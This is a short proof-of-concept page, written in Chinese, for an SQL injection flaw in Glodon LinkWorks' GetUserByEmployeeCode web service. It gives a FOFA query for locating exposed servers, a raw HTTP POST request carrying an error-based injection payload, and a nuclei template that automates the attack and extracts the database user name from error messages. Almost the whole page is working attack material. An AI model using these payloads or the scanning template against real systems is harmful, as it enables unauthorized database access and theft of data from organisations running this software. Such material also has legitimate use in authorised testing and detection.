## 广联达-linkworks-gwgdwebservice存在SQL注入漏洞

## fofa
```
header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
```

## poc
```
POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 41

employeeCode=1'-1/user--'&EncryptData=1
```


![97b447c33371470366be42d552d78d05](https://github.com/wy876/POC/assets/139549762/7cb76c0c-69d3-490c-bd72-fc62624cd7e0)


## nuclei
```
id: glodon-linkworks-service-sqli
info:
  name: glodon-linkworks-service-sqli
  author: unknow
  severity: critical
  description: glodon-linkworks-gwgdwebservice 存在SQL注入漏洞。
  tags: glodon,sqli
  metadata:
    fofa-query: 'header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"'
http:
  - raw:
      - |
        POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
        Host: 
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

        employeeCode=1'-1/{{sqli}}--'&EncryptData=1

    payloads:
      sqli:
        - 'user' 

    extractors:
      - type: regex
        part: body
        name: sqli
        group: 1
        regex:
          - '在将 nvarchar 值 &#39;(.*)&#39; 转换成数据类型 int 时失败。'         

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1==500 && contains(body_1, "在将 nvarchar 值") && contains(body_1, "转换成数据类型 int 时失败") '
          #&& contains(header_1, "text/html")'
```
